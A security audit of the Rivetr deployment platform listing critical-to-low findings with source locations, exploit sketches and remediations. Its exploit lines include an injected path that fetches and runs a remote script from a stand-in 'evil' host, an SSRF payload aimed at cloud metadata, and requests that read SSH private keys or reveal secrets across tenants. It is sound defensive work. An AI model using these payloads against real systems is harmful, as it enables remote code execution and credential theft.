# Rivetr Security Audit — 2026-06-10

Backend (Rust/Axum), frontend (React Router v7), and API interaction. All findings verified against source. Combines backend audit + frontend/API audit.

**Totals:** 3 Critical · 7 High · 10 Medium · 8 Low

---

## CRITICAL

### SEC-C1 — Unauthenticated `/mcp` control-plane endpoint
- **Where:** `src/api/mod.rs:1035` (route), `src/mcp/server.rs:22` (handler)
- **Problem:** `/mcp` is registered on the root router, NOT wrapped by `auth::auth_middleware`. Tools `deploy_app`, `restart_app`, `list_apps`, `get_app_status`, `get_deployment_logs`, `list_deployments`, `list_services`, `list_databases`, `list_projects` are callable with no token.
- **Exploit:** `curl -X POST http://host:8080/mcp -d '{"method":"tools/call","params":{"name":"deploy_app","input":{"app_id":"<id>"}}}'` — anonymous deploy/restart + full config disclosure.
- [x] **FIXED** (`src/api/mod.rs`): `/mcp` now lives in its own router with `auth::auth_middleware` applied. Clients must send a Bearer token / X-API-Key. Path unchanged.

### SEC-C2 — 2FA bypass: pre-2FA temp token is a fully valid session
- **Where:** `src/api/auth.rs:150-176` (login inserts temp token into `sessions`), accepted at `src/api/auth.rs:393-405`; schema `migrations/002_users.sql:15-21` has no temp flag.
- **Problem:** Correct email+password for a 2FA user creates a real `sessions` row, returned with `requires_2fa: true`. `auth_middleware`/`validate_ws_token` authorize any token hash present in `sessions` with future `expires_at` — no column distinguishes pending-2FA from full.
- **Exploit:** POST `/api/auth/login` with password only, use returned `token` as `Authorization: Bearer` against any endpoint for the 5-min window. TOTP never required.
- [x] **FIXED** (migration `111_session_pending_2fa.sql` + `src/db/mod.rs`, `src/db/models/user.rs`, `src/api/auth.rs`, `src/api/ws.rs`, `src/api/two_factor.rs`): added `is_pending_2fa` column. Login's temp session sets it to 1; `auth_middleware`, `get_current_user`, the `/validate` endpoint, and `validate_ws_token_str` all require `is_pending_2fa = 0`; `validate_2fa` only consumes sessions where `is_pending_2fa = 1` and issues a real (0) session.

### SEC-C3 — Broken access control / IDOR across all tenant resources
- **Where:** `get_app` `src/api/apps/crud.rs:57-73`; servers `src/api/servers.rs:78-170`; env var reveal `src/api/env_vars.rs:39-90`; database reveal `src/api/databases.rs:79-97`; container shell `src/api/ws.rs:347-358`; remote terminal/files `src/api/filesystem.rs:223-370`. Membership guard `require_team_role` exists but is used only in teams module (`src/api/teams/mod.rs:163`).
- **Problem:** `auth_middleware` only proves a token belongs to *some* user. Handlers fetch by `WHERE id = ?` with no check the caller is a member of the owning `team_id`. List endpoints with no `team_id` return ALL rows; `team_id` is a client-supplied filter never validated against membership.
- **Exploit:** `GET /api/apps/<other-team-app-id>/env-vars?reveal=true` → decrypted secrets of any app. `GET /api/databases/<id>?reveal=true` → DB creds. `ws://host/api/apps/<id>/terminal?token=<mine>` → root shell in any container. `GET /api/servers/<id>/files/content?path=/root/.ssh/id_rsa` → read any server file. `DELETE /api/apps/<id>` → destroy others' apps.
- [~] **MOSTLY FIXED — central middleware covers all id-scoped resource routes; small config-resource tail + create-time assignment remain.**
  - **Built** `src/api/authz.rs`: `authorize_app` / `authorize_server` / `authorize_database` / `authorize_service` / `authorize_project` / `authorize_deployment`. Semantics: instance admins (`role == "admin"`) and the `system` admin-token user bypass; `team_id IS NULL` resources stay global (preserves legacy/single-user installs); team-scoped resources require membership; apps additionally honor `app_shares`. Added `ApiError::status()` so `StatusCode`-returning handlers can map authz failures.
  - **Central chokepoint — `resource_authz_middleware`** (`src/api/authz.rs`, wired in `src/api/mod.rs` inside the auth layer). Runs after token validation on the whole `/api` group and authorizes **every** request whose path targets a specific resource by UUID: `/api/{apps,servers,databases,services,projects,deployments}/:id/**`. This automatically covers ALL per-resource sub-routes — current and future — including deployments (get/logs/cancel/rollback), app subresources (jobs, replicas, volumes, snapshots, patches, log-drains, monitoring, alerts, previews, network, sharing, basic-auth, env-var key routes), service control/logs/stats/import-export, database backups/extensions/import/logs/storage, and server actions (check/install-docker/fetch-details/patches/apps/files). Literal segments (`with-sharing`, `check-port`) and collection paths fall through.
  - **List endpoints scoped server-side** (privileged → unchanged; non-privileged → only own teams + legacy NULL + shared; a supplied `team_id` the user doesn't belong to → 403): `list_apps` (`apps/crud.rs`), `list_servers` (`servers.rs`), `list_databases` (`databases.rs`), `list_services` (`services/crud.rs`), `list_projects` (`projects.rs`).
  - **WebSocket / SSE (own auth, outside the middleware):** `terminal_ws`, `runtime_logs_ws`, `deployment_logs_ws` (`src/api/ws.rs`), `server_terminal_ws` (`servers.rs`), `service_start_stream_ws`, `database_start_stream_ws` (`start_logs.rs`) all now resolve the user and authorize the target resource.
  - **In-handler defense-in-depth** kept on the worst secret/RCE paths (env vars, db reveal, server creds, file browser, app get/update/delete).
  - [ ] **REMAINING (tracked, lower impact):**
    - [ ] Top-level team-scoped *config* resources NOT under the resource-prefix paths, so not covered by the middleware: `build-servers/:id`, `ssh-keys/:id`, `git-providers/:id` (can hold OAuth tokens), `log-drains`, `destinations`, `ca-certificates`, `notification-channels`, `s3` settings. Add `authz` calls or extend the middleware prefix list + add `authorize_*` for these tables.
    - [ ] Reject a client-supplied `team_id` the user isn't a member of on **create/assign** (create_app/create_server/create_database/create_service/assign_app_project) — privilege-on-create, not read IDOR.
    - [ ] `app_shares` permission level (`view` vs write) is not yet enforced — a view-shared app is currently reachable for mutations too.

---

## HIGH

### SEC-H1 — Unauthenticated DockerHub webhook: SSRF + forced deploys
- **Where:** `src/api/webhooks/dockerhub.rs:38-49` (no signature check), `:138-146` (POST to attacker `callback_url`)
- **Problem:** No secret/signature verification. Parses `callback_url` from body and `reqwest` POSTs to it (follows redirects by default). Also enqueues deployments for any app whose `docker_image` matches attacker-chosen `repo_name`/`tag`.
- **Exploit:** Anonymous payload with matching `repo_name` + `callback_url: "http://169.254.169.254/..."` → blind SSRF + unauthenticated forced redeploy.
- [ ] **Fix:** Require configured shared secret/HMAC (or per-app token in path); validate `callback_url` against `*.docker.com` allowlist; disable redirect-following on that client.

### SEC-H2 — Webhook signature verification optional, disabled by default
- **Where:** `src/api/webhooks/github.rs:149-163`, `gitlab.rs:113-126`; secrets default `None` in `src/config/mod.rs:392-402`
- **Problem:** When `webhooks.github_secret`/`gitlab_token`/`gitea_secret`/`bitbucket_secret` unset (all default `None`), handlers skip verification, accept any anonymous request. Secrets are also global per-provider, not per-app.
- **Exploit:** With no secret, attacker knowing app's `git_url`+`branch` posts forged push to trigger redeploys (DoS / attacker-ref deploy).
- [ ] **Fix:** Require webhook secret (fail closed), reject unsigned. Prefer per-app webhook secrets stored in DB.

### SEC-H3 — Rate limiting bypassable via spoofed `X-Forwarded-For`; no account lockout
- **Where:** `extract_client_ip` `src/api/rate_limit.rs:167-192`; login `src/api/auth.rs:130-217`; 2FA `src/api/two_factor.rs:335`
- **Problem:** Limiter keys buckets on client-controlled `X-Forwarded-For`/`X-Real-IP` with no trusted-proxy check. Rotate header per request → fresh bucket every time. No account lockout/backoff.
- **Exploit:** Login attempts each with unique `X-Forwarded-For` → unlimited password / 6-digit TOTP brute force.
- [ ] **Fix:** Derive client IP from TCP peer (honor `X-Forwarded-For` only from configured trusted proxies); add per-account failed-login throttling/lockout + dedicated low limit for `/login` and `/2fa/validate`.

### SEC-H4 — Command injection in remote file browser via `path`
- **Where:** `src/api/filesystem.rs:239-242,275,307-311,351-354`; executed by `RemoteContext::run_command` `src/engine/remote.rs:65`
- **Problem:** Paths interpolated into shell strings with only `"` escaped, run via `ssh <host> "<cmd>"`. Inside double quotes the remote shell still expands `$(...)` and backticks → arbitrary RCE. Combined with SEC-C3 (no ownership check), runs against any registered server.
- **Exploit:** `GET /api/servers/<id>/files?path=/tmp/$(curl%20evil.sh|sh)` → RCE as SSH user.
- [x] **FIXED** (`src/api/filesystem.rs`): added `validate_remote_path` rejecting shell metacharacters (`$ \` " \\ ; | & < > ( ) { } [ ] * ? ~`, control chars, newlines) on all four handlers before interpolation. Server ownership now also enforced via `authz::authorize_server` (see SEC-C3).

### SEC-H5 — Session token in URL after OAuth login
- **Where:** `src/api/oauth.rs:442` (`Redirect::to("/login?oauth_token={}")`), `frontend/app/routes/login.tsx:111-124`
- **Problem:** OAuth callback 302-redirects to `/login?oauth_token=<full session token>`. Token lands in browser history, proxy/CDN logs, and `TraceLayer` request logs. `navigate(...,{replace:true})` doesn't undo the already-recorded redirect URL.
- [ ] **Fix:** Use a short-lived single-use exchange code (`/login?code=...` POST-exchanged for the real token) or return token in URL fragment (`#oauth_token=`, never sent to servers); frontend consumes immediately.

### SEC-H6 — Auth tokens embedded in WS/SSE URLs as `?token=`
- **Where:** `frontend/app/lib/api/apps.ts:672,683`, `servers.ts:176`, `services.ts:122`, `components/deployment-logs.tsx:106`, `deploy-side-panel.tsx:219`; backend accepts `?token=` on EVERY protected route at `src/api/auth.rs:333-350`, WS at `src/api/ws.rs:21-64`
- **Problem:** Full bearer/admin token in WS/SSE URLs — logged by reverse proxies, `TraceLayer`, intermediaries. Global `?token=` acceptance means any future GET link with a token leaks identically.
- [ ] **Fix:** Authenticate WS via first message after connect (`{type:"auth",token}`, close if absent within timeout) or `Sec-WebSocket-Protocol`. For SSE, mint short-lived (30-60s) single-use stream ticket from an authenticated POST. Restrict `auth_middleware` query-param tokens to allow-listed streaming routes only.

### SEC-H7 — `PUT /api/white-label` missing authz → CSS injection into login page
- **Where:** `src/api/white_label.rs:31-42` (no role check despite "admin only" comment), routed at `src/api/mod.rs:968`; injected at `frontend/app/lib/white-label-context.tsx:78-90`; `GET /api/white-label` public at `mod.rs:1028`
- **Problem:** `update_white_label` extracts no user identity, enforces no role. Any token holder (low-priv member, scoped `rvt_` token) can set `custom_css`/`logo_url`/`login_page_message`/`app_name`. CSS injected into every page including the unauthenticated login page → defacement, phishing overlays, exfil beacons via `url()`. Public GET serves it to all visitors.
- [ ] **Fix:** Add admin role check in `update_white_label`. Sanitize/validate `custom_css` server-side (reject `@import`, off-origin `url()`, `expression`).

---

## MEDIUM

### SEC-M1 — SSRF via notification channels and log drains
- **Where:** `src/notifications/mod.rs:440,502,753` + providers (`lark.rs:28`, `mattermost.rs:27`, `teams.rs:21`, `ntfy.rs:35`, `gotify.rs:30`); test endpoints in `src/api/log_drains.rs`
- **Problem:** `webhook_url`/`server_url`/log-drain `url` fired without validating against internal/link-local ranges; "test" endpoints trigger immediate outbound request on demand. Amplified by SEC-C3.
- [ ] **Fix:** Validate/resolve destination hosts, block private/loopback/link-local ranges (post-DNS and post-redirect); consider egress allowlist.

### SEC-M2 — SSH `StrictHostKeyChecking=no` on all remote execution
- **Where:** `src/engine/remote.rs:49-52`; `src/api/servers.rs:542,823,1064`
- **Problem:** Every SSH connection disables host key verification → MITM can impersonate server, capture commands/credentials (incl. `sshpass` passwords in process args).
- [ ] **Fix:** Pin/record host key on first connect, verify subsequently. Avoid passwords as CLI args (key auth or askpass).

### SEC-M3 — OAuth CSRF state not enforced + email-based account linking
- **Where:** `src/api/oauth.rs:190-208` (state check best-effort, "Don't fail if state verification fails"), `:282-315` (link by email), `:336-341` (open self-registration)
- **Problem:** Callback continues when state missing/invalid → login-CSRF/session fixation. New identities linked to existing local account by email match with no verified-email check. Open self-registration + SEC-C3 = any outsider gains full cross-tenant access.
- [ ] **Fix:** Enforce state strictly (reject on mismatch). Auto-link only when provider asserts verified email. Gate self-registration behind admin allowlist/invitation, no resource access by default.

### SEC-M4 — Non-constant-time secret comparisons
- **Where:** `src/api/auth.rs:570` (`token == config.auth.admin_token`), `src/api/ws.rs:45`, `src/api/webhooks/gitlab.rs:122`
- **Problem:** Admin token (`get_current_user`, reached on every protected route) and GitLab webhook token compared variable-time, despite `auth_middleware` already using `subtle::ct_eq`. Timing side channel on long-lived secrets.
- [ ] **Fix:** Use `subtle::ConstantTimeEq` (with length-equality guard) for all three.

### SEC-M5 — Session tokens in `localStorage` (XSS-exfiltratable)
- **Where:** `frontend/app/lib/auth.ts:19-35`, `frontend/app/lib/api/core.ts:9-12`
- **Problem:** Token in `localStorage` (`rivetr_auth_token`), read into Authorization header each request. Any XSS reads it directly. Amplifies every other XSS vector.
- [ ] **Fix:** Move session token to HttpOnly+Secure+SameSite=Strict cookie set by backend. If localStorage must stay, ship strict CSP (SEC-M6).

### SEC-M6 — No Content-Security-Policy header
- **Where:** `src/api/mod.rs:1132-1172` (`security_headers` — no CSP)
- **Problem:** No CSP. Combined with localStorage tokens, white-label CSS injection, inline theme script (`root.tsx:44`) → no second line of defense against injection/exfil.
- [ ] **Fix:** Add CSP: `default-src 'self'`, explicit `connect-src 'self'` (+ WS origins), `script-src` with nonce/hash for the inline theme script, `frame-ancestors 'none'`.

### SEC-M7 — Open-redirect-style `returnUrl` from localStorage applied unvalidated
- **Where:** `frontend/app/routes/login.tsx:116-122,205-211,229-235`; written at `invitations/accept.tsx:178-179`
- **Problem:** Post-login `navigate(returnUrl)` from `rivetr_return_url`. Currently safe value, but unvalidated user-influenced navigation; `//evil.com` or scheme-relative may be mishandled.
- [ ] **Fix:** Validate `returnUrl` starts with single `/`, not `//`/scheme-relative/absolute; else fall back to `/`.

### SEC-M8 — DB export via top-level GET navigation (CSRF shape)
- **Where:** `frontend/app/routes/services/$id/settings.tsx:652` (`window.location.href`); backend `src/api/services/export_db.rs:35-39`, route `src/api/mod.rs:735`
- **Problem:** DB export invoked via `window.location.href` with no Authorization header. Full-DB-dump GET is a dangerous shape — CSRF-triggerable / cross-site embeddable.
- [ ] **Fix:** Convert to authenticated `fetch` streaming to Blob, or short-lived single-use download ticket. No full DB export via unauthenticated top-level GET.

### SEC-M9 — Invitation token in URL + persisted to localStorage
- **Where:** `frontend/app/routes/invitations/accept.tsx:61,178-179`; `components/teams/invitations-tab.tsx:110`
- **Problem:** Invitation token (grants team membership) read from query string, written to localStorage in return-url. Widens exposure via history/proxy logs.
- [ ] **Fix:** Ensure invitation tokens single-use + short-lived server-side. Don't persist raw token in localStorage; clear promptly after consumption.

### SEC-M10 — Optional encryption-at-rest + fixed KDF salt
- **Where:** `encryption_key: Option<String>` `src/config/mod.rs:101`; fixed salt + 100k PBKDF2 `src/crypto/mod.rs:25-28,44-54`
- **Problem:** If `encryption_key` unset, env vars/SSH keys/OAuth secrets/TOTP secrets stored plaintext (silent passthrough). KEK uses hard-coded salt + 100k SHA-256 iterations (low).
- [ ] **Fix:** Require `encryption_key` at startup (refuse boot, or auto-generate+persist). Per-install random salt + memory-hard KDF (Argon2id) for KEK.

---

## LOW

### SEC-L1 — Auth tokens accepted via URL query string globally
- **Where:** `src/api/auth.rs:333-349`; WS `src/api/ws.rs:71-78,202-208,351-357`
- [ ] **Fix:** Restrict query-param tokens to WS/SSE upgrade routes only; prefer `Sec-WebSocket-Protocol`; scrub `token` from logged URIs.

### SEC-L2 — Long-lived sessions, no rotation/idle timeout
- **Where:** 7-day expiry `src/api/auth.rs:183-186,519-522,748-751`, `src/api/two_factor.rs:448-451`
- [ ] **Fix:** Add idle-timeout + absolute-lifetime checks, rotate on privilege change, add "revoke all sessions".

### SEC-L3 — Missing HSTS and CSP headers
- **Where:** `src/api/mod.rs:1130-1173`
- [ ] **Fix:** Add `Strict-Transport-Security` (when HTTPS) + restrictive CSP. (CSP detailed in SEC-M6.)

### SEC-L4 — Username enumeration via login timing
- **Where:** `src/api/auth.rs:136-147`
- **Problem:** Argon2 verify runs only when email exists; non-existent email returns faster.
- [ ] **Fix:** Dummy Argon2 verify against fixed hash when user not found to equalize timing.

### SEC-L5 — Detailed backend error text surfaced verbatim in UI
- **Where:** `frontend/app/lib/api/core.ts:56-72,104-117`; e.g. `login.tsx:186-189`; backend `auth.rs:430`, `oauth.rs:234-240`
- [ ] **Fix:** Map backend errors to generic user messages; log full detail server-side only.

### SEC-L6 — Token passed as React prop into terminal components
- **Where:** `frontend/app/components/container-terminal.tsx:17-19`, `routes/apps/$id/_index.tsx:173-178`
- [ ] **Fix:** Have streaming components obtain a per-connection ephemeral ticket internally instead of receiving long-lived token as prop. (Visible in React DevTools.)

### SEC-L7 — `validateAuth`/setup-status failures broadly swallowed
- **Where:** `frontend/app/lib/auth.ts:67-85`
- **Problem:** Fail-safe (deny) but masks backend outages; transient setup-status failure routes a fresh install away from `/setup`.
- [ ] **Fix:** Distinguish network errors from authoritative negatives; surface retry state.

### SEC-L8 — KDF iterations/salt hardening (see SEC-M10)
- [ ] **Fix:** Tracked under SEC-M10; logged separately for crypto-hardening backlog.

---

## Verified NOT vulnerable (for the record)
- SQL uses parameterized `sqlx` `.bind()` throughout reviewed paths — no string-concatenated SQL found.
- `git clone` uses argv; `validate_git_url`/`validate_branch` (`src/api/validation/mod.rs:46,104`) restrict scheme + leading `-`, blocking `ext::`/arg injection.
- Backup download/delete reject `/`, `\`, `..` (`src/backup/mod.rs:207-217,726-736`) — not traversable.
- GitHub/Gitea webhook HMACs use `mac.verify_slice` (constant-time); GitHub delivery-ID dedup mitigates replay.
- AES-256-GCM with random per-message nonce correct in `src/crypto/mod.rs`.
- No `dangerouslySetInnerHTML` on user data (only static theme script `root.tsx:44`). No raw markdown rendering.
- xterm output rendered via `@xterm/xterm` widget (DOM-escaped buffer), not an HTML-injection sink.
- Dynamic `href` built as `https://${domain}`; external links use `rel="noopener noreferrer"`.
- Static serving (`mod.rs:1059-1096`) 404s unknown `/api/*`, hashed assets `immutable`, API `no-store`.
- Setup correctly rejects re-run with 403 once a user exists (`auth.rs:432-437`).
- Frontend deps current (React 19, react-router 7.10.1, vite 7, zod 4); no known-vulnerable pinned majors.
